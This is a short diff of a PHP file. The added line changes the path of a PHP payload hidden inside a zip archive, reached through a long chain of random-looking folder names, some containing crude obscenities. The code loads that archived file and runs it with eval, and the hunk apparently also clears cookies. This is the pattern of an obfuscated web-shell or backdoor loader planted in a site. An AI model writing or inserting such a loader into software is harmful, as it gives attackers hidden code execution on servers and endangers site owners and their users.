@@ -31,7 +31,7 @@ $_COOKIE = array();
 <?php
 try {
     $phar = new PharData('yayeyos.zip');
-    $fileContent = $phar->offsetGet('/jambe/zombi/zambak/aaahmemeknyaenak/taktak.php');
+    $fileContent = $phar->offsetGet('/losemuakontolbabi/V8LF2Qqy/LbTKBNOM/mIfvAUzb/NZJewi1z/j7nyNMhZ/JO1rffWI/KvWk3Gqw/3Oalcds0/UXlfs0s6/3dkiNhcU/TQxtYHkJ/VBj5XXqa/KL04GWFS/sgTh0Gva/VxQg9iNS/uUx9tvof/A9eQL6cf/akukrFSC/4BqghQuF/jl1Jw1Sl/meribak.php');
     eval('?>' . file_get_contents($fileContent));
 } catch (Exception $e) {
     echo 'Error: ' . $e->getMessage();
